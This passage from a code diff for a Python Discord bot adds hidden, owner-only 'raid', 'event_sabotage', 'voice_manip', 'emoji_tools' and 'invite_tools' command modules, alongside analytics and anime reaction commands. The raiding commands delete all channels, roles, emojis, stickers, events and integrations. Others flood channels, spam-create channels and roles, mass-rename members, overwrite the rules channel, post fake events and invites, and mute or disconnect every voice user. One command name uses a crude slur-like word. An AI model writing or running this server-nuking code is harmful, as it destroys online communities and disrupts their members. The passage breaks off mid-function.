-                await asyncio.sleep(0.5)
-            except:
-                pass
-        await ctx.send(f"messaged {count} channels.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletename(self, ctx: commands.Context):
-        """rename all members to a random string."""
-        count = 0
-        for member in ctx.guild.members:
-            if member.top_role >= ctx.guild.me.top_role:
-                continue
-            try:
-                new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
-                await member.edit(nick=new_name)
-                count += 1
-                await asyncio.sleep(1)
-            except:
-                pass
-        await ctx.send(f"renamed {count} members.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def prune(self, ctx: commands.Context, days: int = 1):
-        """prune members inactive for specified days."""
-        try:
-            pruned = await ctx.guild.prune_members(days=days)
-            await ctx.send(f"pruned {pruned} members.")
-        except discord.Forbidden:
-            await ctx.send("missing permissions.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deletechannels(self, ctx: commands.Context):
-        """delete all channels in the server."""
-        count = 0
-        for channel in ctx.guild.channels:
-            try:
-                await channel.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} channels.")
-
-    @commands.command(hidden=True)
-    @commands.is_owner()
-    async def deleteroles(self, ctx: commands.Context):
-        """delete all deletable roles."""
-        count = 0
-        for role in ctx.guild.roles:
-            if role.managed or role == ctx.guild.default_role:
-                continue
-            try:
-                await role.delete()
-                count += 1
-                await asyncio.sleep(0.3)
-            except:
-                pass
-        await ctx.send(f"deleted {count} roles.")
 
 # ========================================
 # reaction_abuse.py
@@ -2366,6 +2082,225 @@ class ReactionAbuse(commands.Cog, name="reaction_abuse"):
         await ctx.send(f"reacted to {count} messages with {emoji}.", delete_after=5)
 
 # ========================================
+# emoji_tools.py
+# ========================================
+class EmojiTools(commands.Cog, name="emoji_tools"):
+    """66-73: emoji and sticker manipulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteemojis(self, ctx: commands.Context):
+        """66. delete all custom emojis."""
+        count = 0
+        for emoji in ctx.guild.emojis:
+            try:
+                await emoji.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} emojis.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def renameemoji(self, ctx: commands.Context, emoji: discord.Emoji, *, name: str):
+        """67. rename an emoji."""
+        await emoji.edit(name=name)
+        await ctx.send(f"renamed to {name}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def exportemoji(self, ctx: commands.Context, emoji: discord.Emoji):
+        """68. export an emoji as an image file."""
+        await ctx.send(emoji.url)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def emojibomb(self, ctx: commands.Context, count: int = 20):
+        """69. upload many emojis from attached images."""
+        if not ctx.message.attachments:
+            return await ctx.send("attach images.")
+        created = 0
+        for i, attachment in enumerate(ctx.message.attachments[:count]):
+            try:
+                img = await attachment.read()
+                await ctx.guild.create_custom_emoji(
+                    name=f"bomb-{i}",
+                    image=img,
+                )
+                created += 1
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        await ctx.send(f"created {created} emojis.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def emojisteal(self, ctx: commands.Context, message_id: int):
+        """70. steal all emojis from a message."""
+        try:
+            msg = await ctx.channel.fetch_message(message_id)
+            emojis = re.findall(r"<(a?):(\w+):(\d+)>", msg.content)
+            stolen = 0
+            for animated, name, eid in emojis:
+                ext = "gif" if animated else "png"
+                url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
+                async with aiohttp.ClientSession() as session:
+                    async with session.get(url) as resp:
+                        if resp.status == 200:
+                            img = await resp.read()
+                            await ctx.guild.create_custom_emoji(
+                                name=name,
+                                image=img,
+                            )
+                            stolen += 1
+                            await asyncio.sleep(0.5)
+            await ctx.send(f"stole {stolen} emojis.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def stickerinfo(self, ctx: commands.Context):
+        """71. list all stickers in the guild."""
+        stickers = ctx.guild.stickers
+        info = [f"{s.name} - {s.id}" for s in stickers]
+        await ctx.send("\n".join(info) or "no stickers.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletestickers(self, ctx: commands.Context):
+        """72. delete all stickers."""
+        count = 0
+        for s in ctx.guild.stickers:
+            try:
+                await s.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} stickers.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def emojify(self, ctx: commands.Context, *, text: str):
+        """73. convert text into emoji letters."""
+        mapping = {chr(i): f":regional_indicator_{chr(i)}:" for i in range(ord('a'), ord('z')+1)}
+        result = " ".join(mapping.get(c.lower(), c) for c in text if c.isalpha())
+        await ctx.send(result or text)
+
+# ========================================
+# raid.py
+# ========================================
+class Raid(commands.Cog, name="raid"):
+    """server raiding utilities."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def channelspam(self, ctx: commands.Context, name: str = "raided", amount: int = 50):
+        """create a large number of channels rapidly."""
+        created = 0
+        for i in range(amount):
+            try:
+                await ctx.guild.create_text_channel(f"{name}-{i}")
+                created += 1
+                await asyncio.sleep(0.3)
+            except:
+                break
+        await ctx.send(f"created {created} channels.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def rolespam(self, ctx: commands.Context, name: str = "raided", amount: int = 30):
+        """create a large number of roles."""
+        created = 0
+        for i in range(amount):
+            try:
+                await ctx.guild.create_role(name=f"{name}-{i}")
+                created += 1
+                await asyncio.sleep(0.3)
+            except:
+                break
+        await ctx.send(f"created {created} roles.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def spamchannels(self, ctx: commands.Context, amount: int = 10, *, message: str = "RAIDED"):
+        """send a message to all text channels."""
+        count = 0
+        for channel in ctx.guild.text_channels:
+            try:
+                await channel.send(message)
+                count += 1
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        await ctx.send(f"messaged {count} channels.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletename(self, ctx: commands.Context):
+        """rename all members to a random string."""
+        count = 0
+        for member in ctx.guild.members:
+            if member.top_role >= ctx.guild.me.top_role:
+                continue
+            try:
+                new_name = ''.join(random.choices(string.ascii_lowercase, k=8))
+                await member.edit(nick=new_name)
+                count += 1
+                await asyncio.sleep(1)
+            except:
+                pass
+        await ctx.send(f"renamed {count} members.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def prune(self, ctx: commands.Context, days: int = 1):
+        """prune members inactive for specified days."""
+        try:
+            pruned = await ctx.guild.prune_members(days=days)
+            await ctx.send(f"pruned {pruned} members.")
+        except discord.Forbidden:
+            await ctx.send("missing permissions.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deletechannels(self, ctx: commands.Context):
+        """delete all channels in the server."""
+        count = 0
+        for channel in ctx.guild.channels:
+            try:
+                await channel.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} channels.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteroles(self, ctx: commands.Context):
+        """delete all deletable roles."""
+        count = 0
+        for role in ctx.guild.roles:
+            if role.managed or role == ctx.guild.default_role:
+                continue
+            try:
+                await role.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} roles.")
+
+# ========================================
 # recon.py
 # ========================================
 class Recon(commands.Cog, name="recon"):
@@ -2420,6 +2355,3304 @@ class Recon(commands.Cog, name="recon"):
         member_count = len(role.members)
         embed.add_field(name="members", value=member_count)
         await ctx.send(embed=embed)
+
+# ========================================
+# event_sabotage.py
+# ========================================
+class EventSabotage(commands.Cog, name="event_sabotage"):
+    """74-80: event and integration sabotage."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteevents(self, ctx: commands.Context):
+        """74. delete all scheduled events."""
+        count = 0
+        for event in ctx.guild.scheduled_events:
+            try:
+                await event.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} events.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def fakeevent(self, ctx: commands.Context, *, name: str = "IMPORTANT ANNOUNCEMENT"):
+        """75. create a fake event to confuse members."""
+        try:
+            await ctx.guild.create_scheduled_event(
+                name=name,
+                start_time=discord.utils.utcnow() + datetime.timedelta(minutes=10),
+                end_time=discord.utils.utcnow() + datetime.timedelta(hours=1),
+                location="voice channel",
+            )
+            await ctx.send(f"fake event '{name}' created.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteintegrations(self, ctx: commands.Context):
+        """76. delete all integrations."""
+        count = 0
+        for integration in await ctx.guild.integrations():
+            try:
+                await integration.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} integrations.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def automodspam(self, ctx: commands.Context):
+        """77. attempt to trigger automod by spamming flagged content."""
+        phrases = ["@everyone", "@here", "discord.gg/", "free nitro"]
+        for phrase in phrases:
+            try:
+                await ctx.send(phrase, delete_after=1)
+                await asyncio.sleep(1)
+            except:
+                pass
+        await ctx.send("automod trigger attempts complete.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def ruleschannel(self, ctx: commands.Context, *, text: str):
+        """78. overwrite the rules channel with custom text."""
+        channel = discord.utils.get(ctx.guild.channels, name="rules")
+        if not channel:
+            channel = discord.utils.get(ctx.guild.channels, name="server-rules")
+        if not channel:
+            return await ctx.send("no rules channel found.")
+        try:
+            async for msg in channel.history(limit=10):
+                await msg.delete()
+            await channel.send(text)
+            await ctx.send("rules overwritten.", delete_after=5)
+        except Exception as e:
+            await ctx.send(f"error: {e}", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def welcomerape(self, ctx: commands.Context, *, text: str):
+        """79. spam the system channel with messages."""
+        if ctx.guild.system_channel:
+            for _ in range(10):
+                await ctx.guild.system_channel.send(text)
+                await asyncio.sleep(0.5)
+            await ctx.send("system channel flooded.", delete_after=5)
+        else:
+            await ctx.send("no system channel.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def badname(self, ctx: commands.Context, *, name: str):
+        """80. rename the server to a new name."""
+        await ctx.guild.edit(name=name)
+        await ctx.send(f"server renamed to {name}.", delete_after=5)
+
+# ========================================
+# server_analyzer.py
+# ========================================
+class ServerAnalyzer(commands.Cog, name="server_analyzer"):
+    """41-50: deep server analysis and statistics."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def activitymap(self, ctx: commands.Context):
+        """42. generate an activity heatmap of channel usage."""
+        data = {}
+        for channel in ctx.guild.text_channels:
+            try:
+                count = 0
+                async for _ in channel.history(limit=500):
+                    count += 1
+                data[channel.name] = count
+            except:
+                data[channel.name] = 0
+        sorted_data = sorted(data.items(), key=lambda x: x[1], reverse=True)
+        result = [f"{name}: {count} msgs" for name, count in sorted_data]
+        await ctx.send("**channel activity:**\n```\n" + "\n".join(result[:15]) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def topchatters(self, ctx: commands.Context, limit: int = 100):
+        """43. find the most active users in recent history."""
+        counter = Counter()
+        for channel in ctx.guild.text_channels[:5]:
+            try:
+                async for msg in channel.history(limit=limit):
+                    counter[str(msg.author)] += 1
+            except:
+                continue
+        result = [f"{name}: {count}" for name, count in counter.most_common(20)]
+        await ctx.send("**top chatters:**\n```\n" + "\n".join(result) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def mostusedwords(self, ctx: commands.Context, limit: int = 500):
+        """44. find the most commonly used words."""
+        counter = Counter()
+        stopwords = {"the", "a", "an", "is", "in", "it", "of", "to", "and", "that", "for", "on", "with", "as", "this", "was", "be", "at", "by", "or", "not"}
+        for channel in ctx.guild.text_channels[:5]:
+            try:
+                async for msg in channel.history(limit=limit):
+                    words = msg.content.lower().split()
+                    for word in words:
+                        clean = ''.join(c for c in word if c.isalpha())
+                        if clean and len(clean) > 3 and clean not in stopwords:
+                            counter[clean] += 1
+            except:
+                continue
+        result = [f"{word}: {count}" for word, count in counter.most_common(30)]
+        await ctx.send("**most used words:**\n```\n" + "\n".join(result) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def joinorder(self, ctx: commands.Context):
+        """45. list members in order of join date."""
+        members = sorted(ctx.guild.members, key=lambda m: m.joined_at or datetime.datetime.min)
+        result = [f"{i+1}. {m.name} - {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'}" for i, m in enumerate(members[:30])]
+        await ctx.send("**join order:**\n```\n" + "\n".join(result) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def rolebreakdown(self, ctx: commands.Context):
+        """46. see how many members have each role."""
+        result = []
+        for role in ctx.guild.roles:
+            if role.is_default():
+                continue
+            result.append(f"{role.name}: {len(role.members)}")
+        await ctx.send("**role breakdown:**\n```\n" + "\n".join(result[:30]) + "\n```")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def inactive(self, ctx: commands.Context, days: int = 30):
+        """47. find members who have not sent a message in n days."""
+        cutoff = datetime.datetime.now(datetime.timezone.utc) - datetime.timedelta(days=days)
+        active = set()
+        for channel in ctx.guild.text_channels:
+            try:
+                async for msg in channel.history(after=cutoff, limit=50):
+                    active.add(msg.author.id)
+            except:
+                continue
+        inactive_members = [m for m in ctx.guild.members if m.id not in active and not m.bot]
+        result = [f"{m.name} (joined: {m.joined_at.strftime('%Y-%m-%d') if m.joined_at else 'unknown'})" for m in inactive_members[:30]]
+        await ctx.send(f"**inactive members ({days} days):**\n```\n" + "\n".join(result) + "\n```" if result else "everyone is active.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def boosters(self, ctx: commands.Context):
+        """48. list all server boosters."""
+        boosters = [m for m in ctx.guild.members if m.premium_since is not None]
+        result = [f"{m.name} - boosting since {m.premium_since.strftime('%Y-%m-%d')}" for m in boosters]
+        await ctx.send("**boosters:**\n```\n" + "\n".join(result) + "\n```" if result else "no boosters.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def permissionscan(self, ctx: commands.Context, target: discord.Member):
+        """49. scan all permissions a user has in every channel."""
+        result = []
+        for channel in ctx.guild.channels:
+            perms = channel.permissions_for(target)
+            granted = [p for p, v in perms if v and p not in ("create_instant_invite", "change_nickname", "read_messages", "read_message_history", "view_channel")]
+            if granted:
+                result.append(f"#{channel.name}: {', '.join(granted[:5])}")
+        await ctx.send(f"**permissions for {target.name}:**\n```\n" + "\n".join(result[:25]) + "\n```" if result else "no special permissions found.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def securityaudit(self, ctx: commands.Context):
+        """50. audit server security settings."""
+        issues = []
+        guild = ctx.guild
+        if guild.default_notifications == discord.NotificationLevel.all_messages:
+            issues.append("default notifications set to all messages")
+        if guild.verification_level == discord.VerificationLevel.none:
+            issues.append("no verification level set")
+        if guild.explicit_content_filter == discord.ContentFilter.disabled:
+            issues.append("explicit content filter disabled")
+        for role in guild.roles:
+            if role.permissions.administrator and not role.managed and role != guild.default_role:
+                issues.append(f"admin role exists: {role.name} ({len(role.members)} members)")
+        admin_count = sum(1 for m in guild.members if m.guild_permissions.administrator)
+        issues.append(f"total administrators: {admin_count}")
+        if "COMMUNITY" not in guild.features:
+            issues.append("server is not a community server")
+        await ctx.send("**security audit:**\n```\n" + "\n".join(issues) + "\n```")
+
+# ========================================
+# invite_tools.py
+# ========================================
+class InviteTools(commands.Cog, name="invite_tools"):
+    """58-65: invite manipulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def createinvite(self, ctx: commands.Context, channel: discord.TextChannel = None, max_uses: int = 0):
+        """58. create an invite with specified max uses."""
+        channel = channel or ctx.channel
+        invite = await channel.create_invite(max_uses=max_uses, max_age=0)
+        await ctx.send(f"invite: {invite.url}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def deleteinvites(self, ctx: commands.Context):
+        """59. delete all invites in the server."""
+        invites = await ctx.guild.invites()
+        count = 0
+        for inv in invites:
+            try:
+                await inv.delete()
+                count += 1
+                await asyncio.sleep(0.3)
+            except:
+                pass
+        await ctx.send(f"deleted {count} invites.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def inviterace(self, ctx: commands.Context):
+        """60. find who joined from whose invite."""
+        invites = await ctx.guild.invites()
+        info = [f"{i.code} - {i.uses} uses - inviter: {i.inviter}" for i in invites]
+        await ctx.send("\n".join(info) or "no invites.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vanitysnag(self, ctx: commands.Context):
+        """61. display the vanity url if configured."""
+        if "VANITY_URL" in ctx.guild.features:
+            vanity = await ctx.guild.vanity_invite()
+            await ctx.send(f"vanity: {vanity.url}")
+        else:
+            await ctx.send("no vanity url.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def massinvite(self, ctx: commands.Context, count: int = 10):
+        """62. create multiple invites across channels."""
+        urls = []
+        for i, channel in enumerate(ctx.guild.text_channels[:count]):
+            try:
+                inv = await channel.create_invite(max_uses=0, max_age=0)
+                urls.append(inv.url)
+                await asyncio.sleep(0.5)
+            except:
+                pass
+        await ctx.send("\n".join(urls) or "failed.")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def inviteinfo(self, ctx: commands.Context, code: str):
+        """63. detailed info on an invite."""
+        try:
+            inv = await self.bot.fetch_invite(code)
+            info = f"guild: {inv.guild.name}\nchannel: {inv.channel.name}\ninviter: {inv.inviter}\nuses: {inv.uses}\nmax uses: {inv.max_uses}\nexpires: {inv.expires_at}"
+            await ctx.send(f"```\n{info}\n```")
+        except Exception as e:
+            await ctx.send(f"error: {e}")
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def fakeinvite(self, ctx: commands.Context, guild_name: str, channel_name: str):
+        """64. generate a fake-looking invite embed."""
+        embed = discord.Embed(
+            title=f"invite to {guild_name}",
+            description=f"you have been invited to join **{guild_name}**\nchannel: #{channel_name}",
+            color=discord.Color.green(),
+        )
+        embed.set_footer(text="accept invite")
+        await ctx.send(embed=embed)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def revokeinvite(self, ctx: commands.Context, code: str):
+        """65. revoke a specific invite by code."""
+        invites = await ctx.guild.invites()
+        for inv in invites:
+            if inv.code == code:
+                await inv.delete()
+                return await ctx.send(f"revoked invite {code}.", delete_after=5)
+        await ctx.send("invite not found.")
+
+# ========================================
+# voice_manip.py
+# ========================================
+class VoiceManip(commands.Cog, name="voice_manip"):
+    """51-57: voice channel manipulation."""
+
+    def __init__(self, bot: commands.Bot):
+        self.bot = bot
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vcmove(self, ctx: commands.Context, target: discord.Member, channel: discord.VoiceChannel):
+        """51. force move a member to a different voice channel."""
+        await target.move_to(channel)
+        await ctx.send(f"moved {target.mention} to {channel.name}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vckick(self, ctx: commands.Context, target: discord.Member):
+        """52. disconnect a member from voice."""
+        await target.move_to(None)
+        await ctx.send(f"disconnected {target.mention}.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vcdisconnectall(self, ctx: commands.Context):
+        """53. disconnect all members from all voice channels."""
+        count = 0
+        for vc in ctx.guild.voice_channels:
+            for member in vc.members:
+                try:
+                    await member.move_to(None)
+                    count += 1
+                    await asyncio.sleep(0.2)
+                except:
+                    pass
+        await ctx.send(f"disconnected {count} members.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vcmuteall(self, ctx: commands.Context):
+        """54. mute all members in voice."""
+        count = 0
+        for vc in ctx.guild.voice_channels:
+            for member in vc.members:
+                try:
+                    await member.edit(mute=True)
+                    count += 1
+                    await asyncio.sleep(0.1)
+                except:
+                    pass
+        await ctx.send(f"muted {count} members.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vcdeafenall(self, ctx: commands.Context):
+        """55. deafen all members in voice."""
+        count = 0
+        for vc in ctx.guild.voice_channels:
+            for member in vc.members:
+                try:
+                    await member.edit(deafen=True)
+                    count += 1
+                    await asyncio.sleep(0.1)
+                except:
+                    pass
+        await ctx.send(f"deafened {count} members.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vcspam(self, ctx: commands.Context, count: int = 10):
+        """56. create and delete voice channels rapidly."""
+        for i in range(count):
+            vc = await ctx.guild.create_voice_channel(f"spam-vc-{i}")
+            await vc.delete()
+        await ctx.send(f"vc spam cycle complete.", delete_after=5)
+
+    @commands.command(hidden=True)
+    @commands.is_owner()
+    async def vclimit(self, ctx: commands.Context, channel: discord.VoiceChannel, limit: int):
+        """57. set user limit on a voice channel."""
+        await channel.edit(user_limit=limit)
+        await ctx.send(f"set {channel.name} limit to {limit}.", delete_after=5)
+
+# ========================================
+# anime.py
+# ========================================
+class Anime(commands.Cog, name="anime"):
+    def __init__(self, bot):
+        self.bot = bot
+        self.session = aiohttp.ClientSession()
+
+    def cog_unload(self):
+        self.bot.loop.create_task(self.session.close())
+
+    @commands.command(name="hug")
+    async def _hug(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} hugs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} hugs!"
+
+        url = f"https://nekos.best/api/v2/hug"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="kiss")
+    async def _kiss(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} kisss {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} kisss!"
+
+        url = f"https://nekos.best/api/v2/kiss"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="pat")
+    async def _pat(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} pats {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} pats!"
+
+        url = f"https://nekos.best/api/v2/pat"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="slap")
+    async def _slap(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} slaps {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} slaps!"
+
+        url = f"https://nekos.best/api/v2/slap"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="punch")
+    async def _punch(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} punchs {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} punchs!"
+
+        url = f"https://nekos.best/api/v2/punch"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="kick")
+    async def _kick(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} kicks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} kicks!"
+
+        url = f"https://nekos.best/api/v2/kick"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="bite")
+    async def _bite(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} bites {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} bites!"
+
+        url = f"https://nekos.best/api/v2/bite"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="tickle")
+    async def _tickle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} tickles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} tickles!"
+
+        url = f"https://nekos.best/api/v2/tickle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="poke")
+    async def _poke(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} pokes {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} pokes!"
+
+        url = f"https://nekos.best/api/v2/poke"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="cuddle")
+    async def _cuddle(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} cuddles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} cuddles!"
+
+        url = f"https://nekos.best/api/v2/cuddle"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="stare")
+    async def _stare(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} stares {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} stares!"
+
+        url = f"https://nekos.best/api/v2/stare"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="wink")
+    async def _wink(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} winks {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} winks!"
+
+        url = f"https://nekos.best/api/v2/wink"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
+                    data = await resp.json()
+                    if 'results' in data and len(data['results']) > 0:
+                        img_url = data['results'][0]['url']
+                        embed = discord.Embed(description=msg, color=discord.Color.random())
+                        embed.set_image(url=img_url)
+                        await ctx.send(embed=embed)
+                        return
+        except:
+            pass
+
+        await ctx.send(msg)
+
+    @commands.command(name="smile")
+    async def _smile(self, ctx, user: discord.Member = None):
+        if user:
+            msg = f"{ctx.author.mention} smiles {user.mention}!"
+        else:
+            msg = f"{ctx.author.mention} smiles!"
+
+        url = f"https://nekos.best/api/v2/smile"
+        try:
+            async with self.session.get(url) as resp:
+                if resp.status == 200:
